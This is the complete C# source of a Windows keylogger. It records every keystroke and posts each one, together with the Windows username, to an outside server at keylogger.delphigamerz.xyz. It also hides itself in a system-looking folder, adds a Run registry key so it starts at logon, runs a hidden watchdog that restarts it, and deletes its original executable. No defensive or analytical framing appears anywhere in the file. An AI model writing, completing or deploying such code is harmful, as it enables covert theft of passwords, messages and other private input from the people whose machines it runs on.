using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Http;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;

namespace KeyLogger
{
    internal static class Program
    {
        private static string buf = "";
        private static readonly HttpClient client = new HttpClient();
        private static readonly string apiUrl = "https://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;

        private static string InstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Shell", "Associations", "UrlAssociations", "http", "UserChoice", "KeyLogger.exe");

        private static bool[] lastKeyState = new bool[256];

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main(String[] args)
        {
            bool isWatchdog = args.Contains("--watchdog");

            if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
            {
                // If disabled, also try to kill any running instance from the install path
                // to make it "stop" as requested.
                try
                {
                    foreach (var process in Process.GetProcessesByName("KeyLogger"))
                    {
                        try
                        {
                            if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
                            {
                                process.Kill();
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                return;
            }

            if (isWatchdog)
            {
                RunWatchdog();
                return;
            }

            EnsureInstalled();

            // Start watchdog if not already running
            StartWatchdog();

            while (true)
            {
                Thread.Sleep(10);

                // Watchdog monitoring: Ensure watchdog is running
                if (!IsWatchdogRunning())
                {
                    StartWatchdog();
                }

                // An even more advanced check
                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                // Keys.ShiftKey doesn't work, so using its numeric equivalent
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                bool isBig = shift | caps;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    bool isDown = (state & 0x8000) == 0x8000;

                    if (isDown && !lastKeyState[i])
                    {
                        // Key just pressed
                        lastKeyState[i] = true;

                        // Check for Space and Enter
                        if (((Keys)i) == Keys.Space) { buf += " "; }
                        else if (((Keys)i) == Keys.Enter) { buf += "\r\n"; }
                        // Skip mouse buttons
                        else if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) { /* ignore */ }
                        // Skip Shift, Ctrl, Alt, and other modifier keys
                        else if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) { /* ignore */ }
                        else if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) { /* ignore */ }
                        else if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) { /* ignore */ }
                        // Skip other non-essential keys
                        else if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) { /* ignore */ }
                        else if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) { /* ignore */ }
                        else if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) { /* ignore */ }
                        else if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) { /* ignore */ }
                        else if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) { /* ignore */ }
                        else if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) { /* ignore */ }
                        // Handle single character keys
                        else if (((Keys)i).ToString().Length == 1)
                        {
                            char key = ((Keys)i).ToString()[0];
                            if (char.IsLetter(key) && isBig)
                            {
                                buf += char.ToUpper(key);
                            }
                            else if (char.IsLetter(key) && !isBig)
                            {
                                buf += char.ToLower(key);
                            }
                            else
                            {
                                buf += key;
                            }
                        }
                        else
                        {
                            // Wrap non-single-character keys in angle brackets
                            buf += $"<{((Keys)i).ToString()}>";
                        }

                        if (buf.Length > 0)
                        {
                            _ = SendPayload(buf);
                            buf = "";
                        }
                    }
                    else if (!isDown && lastKeyState[i])
                    {
                        // Key just released
                        lastKeyState[i] = false;
                    }
                }
            }
        }

        private static async Task SendPayload(string payload)
        {
            try
            {
                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                await client.PostAsync(apiUrl, content);
            }
            catch (Exception)
            {
                // Silently ignore errors
            }
        }

        private static void RunWatchdog()
        {
            while (true)
            {
                Thread.Sleep(1000);

                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
                {
                    return;
                }

                if (!IsMainProcessRunning())
                {
                    try
                    {
                        Process.Start(InstallPath);
                    }
                    catch { }
                }
            }
        }

        private static bool IsMainProcessRunning()
        {
            foreach (var process in Process.GetProcessesByName("KeyLogger"))
            {
                try
                {
                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
                    {
                        // Check if it's NOT the watchdog
                        // This is tricky because we can't easily see command line args of other processes in .NET 4.8 easily without WMI
                        // But we can assume if it's running from InstallPath and we are the watchdog, there should be another one.
                        // Actually, let's just check if there's any OTHER process with the same name and path.
                        if (process.Id != Process.GetCurrentProcess().Id)
                        {
                            return true;
                        }
                    }
                }
                catch { }
            }
            return false;
        }

        private static bool IsWatchdogRunning()
        {
            // Same logic as IsMainProcessRunning - if there's another instance, we assume it's the partner.
            // This is a bit simplistic but works for a two-process system.
            return IsMainProcessRunning();
        }

        private static void StartWatchdog()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = InstallPath,
                    Arguments = "--watchdog",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi);
            }
            catch { }
        }

        private static void EnsureInstalled()
        {
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;

            if (!string.Equals(currentExe, InstallPath, StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    string installDirectory = Path.GetDirectoryName(InstallPath);
                    if (!Directory.Exists(installDirectory))
                    {
                        Directory.CreateDirectory(installDirectory);
                    }

                    // Kill existing process if it's running from InstallPath to allow overwrite
                    foreach (var process in Process.GetProcessesByName("KeyLogger"))
                    {
                        try
                        {
                            if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
                            {
                                process.Kill();
                                process.WaitForExit(5000);
                            }
                        }
                        catch { /* Ignore processes we can't access */ }
                    }

                    File.Copy(currentExe, InstallPath, true);

                    // Register for startup
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        key.SetValue("KeyLogger", $"\"{InstallPath}\"");
                    }

                    // Start the installed version
                    Process.Start(InstallPath);

                    // Self-deletion of the original executable
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C choice /C Y /N /D Y /T 3 & del \"{currentExe}\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    };
                    Process.Start(psi);

                    Environment.Exit(0);
                }
                catch (Exception)
                {
                    // If installation fails (e.g. permissions), just continue running from current location
                }
            }
        }
    }
}
